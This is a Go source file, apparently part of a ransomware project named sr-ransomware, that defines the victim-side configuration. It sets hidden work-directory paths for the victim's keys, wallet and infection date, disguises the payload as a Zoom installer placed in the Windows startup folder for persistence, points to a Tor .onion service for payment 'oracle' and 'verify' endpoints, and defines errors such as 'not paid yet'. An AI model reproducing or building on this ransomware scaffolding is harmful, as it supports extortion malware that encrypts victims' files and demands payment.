package victim

import (
    "os"

    "github.com/sug0/sr-ransomware/go/win"
    "github.com/sug0/sr-ransomware/go/errors"
)

const pkg = "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"

var (
    workDir = os.Getenv("APPDATA") + `\Zoomer`
    tempDir = os.Getenv("TMP")

    victimEthereumWallet = workDir + `\a.flu`
    victimPublicKey      = workDir + `\b.flu`
    victimSecretKey      = workDir + `\c.flu`
    victimInfectionDate  = workDir + `\d.flu`
    victimAESKey         = workDir + `\e.flu`

    torDirectory  = workDir + `\Tor`
    zoomInstaller = tempDir + `\ZoomInstaller.exe`
    cryptoPayload = win.StartupFolder() + `\ZoomUp.exe`

    // cast magicBytes to array lol, very safe indeed
    // all victims will be on little endian systems anyway
    magicNumbers = [2]uint64{5496115860211979594, 2970722429258834005}
)

const (
    hiddenServiceBase   = "http://64mdqdzcrf2u7tklmngd6ob7ki6gnlokfyjctpj6p6bmdfnhisib3xid.onion"
    hiddenServiceOracle = hiddenServiceBase + "/oracle"
    hiddenServiceVerify = hiddenServiceBase + "/verify/"

    magicBytes = "JUSTA FLU BRO :)"

    rsaKeyBits = 2048
)

var (
    errNotFullWrite = errors.New(pkg, "failed to write all data")
    errNotFluFile   = errors.New(pkg, "not a flu file")
    errNotAdmin     = errors.New(pkg, "user is not admin")
    errNotPaid      = errors.New(pkg, "not paid yet")
)
